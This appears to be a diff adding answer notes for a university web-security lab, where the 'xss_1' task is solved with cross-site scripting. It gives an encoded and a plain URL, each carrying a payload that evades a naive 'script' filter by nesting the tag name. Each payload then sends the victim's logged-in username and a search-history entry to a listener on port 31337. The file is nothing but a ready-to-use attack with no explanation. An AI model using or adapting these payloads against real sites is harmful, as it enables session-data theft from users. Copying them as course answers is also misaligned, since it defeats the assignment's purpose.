@@ -1,0 +1,5 @@
+xss_1 ENCODED solution:
+https://project2.ecen4133.org/search?xssdefense=1&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='%2B$("%23logged-in-user").text()%2B'	%26last_search='%2B$("%23history-list").children()[1].innerHTML})</scrscriptipt>
+
+xss_1 Plain solution:
+https://project2.ecen4133.org/search?xssdefense=1&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+'	&last_search='+$("#history-list").children()[1].innerHTML})</scrscriptipt>
